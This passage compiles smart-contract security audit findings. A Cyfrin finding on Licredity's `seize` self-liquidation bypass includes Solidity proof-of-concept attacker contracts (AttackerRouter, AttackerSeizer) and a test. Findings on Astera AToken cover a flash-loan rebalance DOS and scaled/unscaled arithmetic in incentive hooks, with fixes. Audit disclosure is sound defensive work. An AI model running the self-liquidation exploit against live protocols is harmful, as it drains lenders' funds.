**Cyfrin:** Verified. Index is now updated.

\clearpage

**Description:** When calling [`Licredity::seize`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L550-L558) to liquidate an unhealthy position, the contract checks that the position owner is not the caller:

```solidity
// prevents owner from purposely causing a position to be underwater then profit from seizing it
// side effect is that positions cannot be seized by owner contract, such as non-fungible position manager, which is acceptable
if (position.owner == msg.sender) {
    assembly ("memory-safe") {
        mstore(0x00, 0x7c474390) // 'CannotSeizeOwnPosition()'
        revert(0x1c, 0x04)
    }
}
```

This check can be bypassed by calling `seize` through a separate contract. The position owner orchestrates the liquidation via a helper (“proxy”) contract so that `msg.sender` in `Licredity::seize` is the proxy, not the owner. Using `Licredity::unlock` and its callback, the attacker can open and under-collateralize a position and immediately self-liquidate it in the same transaction, socializing the loss to lenders.

**Impact:** The owner can liquidate their own under-collateralized position and capture the liquidator bonus, while pushing the shortfall onto lenders/the protocol. This can be performed atomically, repeated to farm incentives, and scaled up to available liquidity and configuration limits. No price movement is required, making it a practical drain of protocol value.

**Proof of Concept:** Add the following test to `LicreditySeize.t.sol`. It shows how an attacker can deploy an `AttackerRouter` and `AttackerSeizer` to open an unhealthy position and immediately self-liquidate it in the same `unlock` call:
```solidity
function test_seize_ownPosition_using_external_contract() public {
    /// open large position for existing lenders
    uint256 positionId = licredityRouter.open();
    token.mint(address(this), 10 ether);
    token.approve(address(licredityRouter), 10 ether);

    licredityRouter.depositFungible(positionId, Fungible.wrap(address(token)), 10 ether);

    uint128 borrowAmount = 9 ether;
    (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();
    uint256 delta = borrowAmount.toShares(totalAssets, totalShares);

    licredityRouterHelper.addDebt(positionId, delta, address(1));

    // Attacker deploys router and helper contract to seize the position
    AttackerSeizer seizer = new AttackerSeizer(licredity);
    AttackerRouter attackerRouter = new AttackerRouter(licredity, token, seizer);

    // attack commences
    attackerRouter.depositFungible(0.5 ether);
}
```
And add these two contracts used:
```solidity
contract AttackerRouter {
    using StateLibrary for Licredity;
    using ShareMath for uint128;

    Licredity public licredity;
    BaseERC20Mock public token;
    AttackerSeizer public seizer;

    constructor(Licredity _licredity, BaseERC20Mock _token, AttackerSeizer _seizer) {
        licredity = _licredity;
        token = _token;
        seizer = _seizer;
    }

    function depositFungible(uint256 amount) external {
        // 1. add some collateral to the position
        //    so that it can become healthy after seize
        uint256 positionId = licredity.open();
        licredity.stageFungible(Fungible.wrap(address(token)));
        token.mint(address(licredity), amount);
        licredity.depositFungible(positionId);

        // 2. call unlock to take on debt and seize
        licredity.unlock(abi.encode(positionId));
        // 5. as `unlock` doesn't revert, the position has become healthy
    }

    function unlockCallback(bytes calldata data) public returns (bytes memory) {
        uint256 positionId = abi.decode(data, (uint256));

        // 3. increase debt share to make the position unhealthy
        uint128 borrowAmount = 1 ether;
        (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();
        uint256 delta = borrowAmount.toShares(totalAssets, totalShares);
        licredity.increaseDebtShare(positionId, delta, address(this));

        // 4. use the separate seizer contract to seize the position
        //    making it healthy again.
        seizer.seize(positionId);

        return new bytes(0);
    }
}

contract AttackerSeizer {
    Licredity public licredity;

    constructor(Licredity _licredity) {
        licredity = _licredity;
    }

    function seize(uint256 positionId) external {
        licredity.seize(positionId, msg.sender);
    }
}
```

**Recommended Mitigation:** In addition to enforcing `position.owner != msg.sender`, constrain `seize` so it must be the first operation in an `unlock` execution. As the `Locker` library already tracks if the position has been touched before, it can expose this to `seize`. And if the position has been touched, revert. This mirrors the approach used by Euler’s EVC/EVK combo to block atomic “create/borrow/self-liquidate” flows ([code](https://github.com/euler-xyz/euler-vault-kit/blob/master/src/EVault/modules/Liquidation.sol#L93-L95)).

**Licredity:** Fixed in [PR#57](https://github.com/Licredity/licredity-v1-core/pull/57/files), commit [`e9490bb`](https://github.com/Licredity/licredity-v1-core/commit/e9490bb3f82fdd829288a76af5d421c10570e6ba)

**Cyfrin:** Verified. `seize` now checks that there are no prior registrations of the same position in `Locker`.

## Security Report

## Severity: High Risk

### Context
`AToken.sol#L388`

### Description
During a flash loan, the AToken contract transfers the underlying amount to the user through the `transferUnderlyingTo` function, which withdraws tokens from the vault when using it:

```solidity
function transferUnderlyingTo(address target, uint256 amount)
    external
    override
    onlyLendingPool
    returns (uint256)
{
    _rebalance(amount);
    _underlyingAmount = _underlyingAmount - amount;
    IERC20(_underlyingAsset).safeTransfer(target, amount);
    return amount;
}
```

After executing the receiver logic, the underlying tokens are transferred back to the AToken contract, but the rebalance is not triggered. This could lead to a situation where the vault is left without tokens, causing a DOS in vault rehypothecation:

```solidity
function handleRepayment(address user, address onBehalfOf, uint256 amount)
    external
    override
    onlyLendingPool
{
    _underlyingAmount = _underlyingAmount + amount;
}
```

A full fuzzing test was provided by Cod3x team and can be found in the echidna branch.

### Recommendation
Consider calling the `_rebalance` function exclusively during flashloan operations, since triggering `_rebalance` during liquidation or repayment flows may cause another DOS if the vault is paused or has reached its deposit cap.

### Audits
- **Astera:** Fixed in commit `4605e906`.
- **Spearbit:** Fix verified.

## Severity: High Risk

## Context
ATokenERC6909.sol#L396-L432.

## Description
Mixing of scaled and unscaled parameters in arithmetic (addition/subtraction) operations has been used in `_afterTokenTransfer`. The amount input to `_afterTokenTransfer` comes from `super.{transfer, transferFrom, _mint, _burn}` of ERC6909, which is a scaled down amount (scaled down by the corresponding index, `x.rayDiv(i)`).

However, the following parameters are **not scaled down** and include the indices:

- `uint256 oldSupply = totalSupply(id); // not scaled` (only at this line later when `_decrementTotalSupply` or `_incrementTotalSupply` is called it would be scaled)
- `uint256 oldFromBalance = balanceOf(from, id); // not scaled`
- `uint256 oldToBalance = balanceOf(to, id); // not scaled`

Here is the summary line by line:

```solidity
function _afterTokenTransfer(
    address from,
    address to,
    uint256 id,
    uint256 amount // scaled
)
internal
override
{
    uint256 oldSupply = totalSupply(id); // not scaled
    uint256 oldFromBalance = balanceOf(from, id); // not scaled
    uint256 oldToBalance = balanceOf(to, id); // not scaled
    if (from == address(0) && to != address(0)) {
        oldSupply = _incrementTotalSupply(id, amount); // scaled
        oldToBalance = oldToBalance - amount; // mix: (not scaled) - (scaled)
        oldFromBalance = 0;
        if (address(INCENTIVES_CONTROLLER) != address(0)) {
            INCENTIVES_CONTROLLER.handleAction(id, to,
                oldSupply, // scaled
                oldToBalance // mix: (not scaled) - (scaled)
            );
        }
    } else if (to == address(0) && from != address(0)) {
        oldSupply = _decrementTotalSupply(id, amount); // scaled
        oldFromBalance = oldFromBalance + amount; // mix: (not scaled) + (scaled)
        oldToBalance = 0;
        if (address(INCENTIVES_CONTROLLER) != address(0)) {
            INCENTIVES_CONTROLLER.handleAction(id, from,
                oldSupply, // scaled
                oldFromBalance // mix: (not scaled) + (scaled)
            );
        }
    } else {
        oldFromBalance = oldFromBalance + amount; // mix: (not scaled) + (scaled)
        oldToBalance = oldToBalance - amount; // mix: (not scaled) - (scaled)
        if (address(INCENTIVES_CONTROLLER) != address(0)) {
            INCENTIVES_CONTROLLER.handleAction(id, from,
                oldSupply, // not scaled
                oldFromBalance // mix: (not scaled) + (scaled)
            );
            if (from != to) {
                INCENTIVES_CONTROLLER.handleAction(id, to,
                    oldSupply, // not scaled
                    oldToBalance // mix: (not scaled) - (scaled)
                );
            }
        }
    }
}
```

For the ATokens in `IncentivizedERC20`, the `_transfer`, `_mint`, and `_burn` functions supply the scaled total supply and balances to the incentives controller, which means the units of the non-rebasing aToken are used there.

## Recommendation
Make sure scaled units/amounts are supplied to `INCENTIVES_CONTROLLER.handleAction`:

```diff
diff --git a/contracts/protocol/tokenization/ERC6909/ATokenERC6909.sol b/contracts/protocol/tokenization/ERC6909/ATokenERC6909.sol
index 2de411d..fc521b0 100644
--- a/contracts/protocol/tokenization/ERC6909/ATokenERC6909.sol
+++ b/contracts/protocol/tokenization/ERC6909/ATokenERC6909.sol
@@ -390,21 +390,21 @@ contract ATokenERC6909 is IncentivizedERC6909, VersionedInitializable {
 * @param from The address tokens are transferred from.
 * @param to The address tokens are transferred to.
 * @param id The token ID being transferred.
- * @param amount The amount being transferred.
+ * @param amount The amount being transferred in shares.
 * @dev Updates incentives based on transfer type (mint/burn/transfer).
+ * @dev this hook gets called from solday 's `ERC6909` which only deals with shares
 */
function _afterTokenTransfer(address from, address to, uint256 id, uint256 amount)
internal
override
{
- uint256 oldSupply = totalSupply(id);
- uint256 oldFromBalance = balanceOf(from, id);
- uint256 oldToBalance = balanceOf(to, id);
+ uint256 oldSupply = super.totalSupply(id);
+ uint256 oldFromBalance = super.balanceOf(from, id);
+ uint256 oldToBalance = super.balanceOf(to, id);
 // If the token was minted.
 if (from == address(0) && to != address(0)) {
    oldSupply = _incrementTotalSupply(id, amount);
    oldToBalance = oldToBalance - amount;
-   oldFromBalance = 0;
    if (address(INCENTIVES_CONTROLLER) != address(0)) {
        INCENTIVES_CONTROLLER.handleAction(id, to, oldSupply, oldToBalance);
    }
@@ -412,7 +412,6 @@ contract ATokenERC6909 is IncentivizedERC6909, VersionedInitializable {
} else if (to == address(0) && from != address(0)) {
    oldSupply = _decrementTotalSupply(id, amount);
    oldFromBalance = oldFromBalance + amount;
-   oldToBalance = 0;
    if (address(INCENTIVES_CONTROLLER) != address(0)) {
        INCENTIVES_CONTROLLER.handleAction(id, from, oldSupply, oldFromBalance);
    }
```

Moreover, this hook can be moved to `IncentivizedERC6909` to mimic the pattern from the `IncentivizedERC20` counterpart. In general, it might make sense to use Solidity's type system and override arithmetic operations to guarantee type safety during compilation and avoid mistakes like the above.

